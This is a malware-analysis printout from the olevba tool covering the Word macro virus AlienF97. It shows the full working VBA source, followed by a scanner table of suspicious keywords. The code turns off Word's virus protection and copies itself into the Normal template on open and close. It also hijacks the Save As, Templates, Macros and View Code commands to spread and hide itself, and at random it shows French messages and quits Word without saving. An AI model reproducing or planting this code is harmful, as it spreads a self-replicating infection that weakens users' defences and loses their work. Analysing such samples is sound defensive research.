olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Af.a-499a58369b38623fde3b452fad3ddbe6e15c610d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Af.a-499a58369b38623fde3b452fad3ddbe6e15c610d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO AlienF97.bas 
in file: Virus.MSWord.Af.a-499a58369b38623fde3b452fad3ddbe6e15c610d - OLE stream: 'Macros/VBA/AlienF97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "AlienF97" Then
        AlienInstalled = -1
    End If
Next i
If Not AlienInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AlienF97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "AlienF97" Then
        AlienInstalled = -1
    End If
Next i
If Not AlienInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="AlienF97", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
Dim MyDate, MyWeek, Longueur
Nom$ = ActiveDocument.Name
Longueur = Len(Nom$)
Randomize
a$ = Int(Rnd * 12) + 1
MyDate = Date
D$ = Mid(MyDate, 1, 5)
MyWeek = WeekDay(MyDate, vbMonday)
If D$ = "01/08" Then
Select Case a$
    Case 1 To 6
        MsgBox "Quelques Années de Survie...", Title:="AlienF97"
        Application.Quit SaveChanges:=wdDoNotSaveChanges
End Select
End If
If MyWeek = "7" Then
Select Case a$
    Case 7 To 12
        MsgBox "C'est Dimanche & J'ai l'intention de me relaxer", Title:="AlienF97"
        Application.Quit SaveChanges:=wdDoNotSaveChanges
End Select
End If

If Longueur < 9 Then
    MsgBox "Longueur De Noms De Fichier Déjà Utilisé", Title:="Tip de la part d'AlienF97"
End If

If (a$ = "1") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "N'ouvrez Jamais d'Autres Fichiers !", Title:="AlienF97"
End If
If (a$ = "2") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Ne Faîtes Pas Confiance à Un Alien !", Title:="AlienF97"
End If
If (a$ = "3") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Ne Croyez Pas Tous Les Tips!", Title:="AlienF97"
End If
If (a$ = "4") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Sauvegarder Souvent Vos Données.", Title:="AlienF97"
End If
If (a$ = "5") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Trois Acclamations pour AlienF97." & Chr$(13) & "Hip Hip Hourra !", Title:="AlienF97"
End If
If (a$ = "6") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Je Reviendrai !", Title:="AlienF97"
End If
If (a$ = "7") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Salut Beauté !", Title:="AlienF97"
End If
If (a$ = "8") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Tu Me Facines.", Title:="AlienF97"
End If
If (a$ = "9") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Ne Regarde Pas Trop Loin !", Title:="AlienF97"
End If
If (a$ = "10") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "Le Virus 'AlienF97' Est Arrivé !", Title:="AlienF97"
End If
If (a$ = "11") And (MyWeek <> "7") And (D$ <> "01/08") Then
    MsgBox "AlienF97 Est En Vie...", Title:="AlienF97"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="AlienF97", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserForm900.Show
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserForm999.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

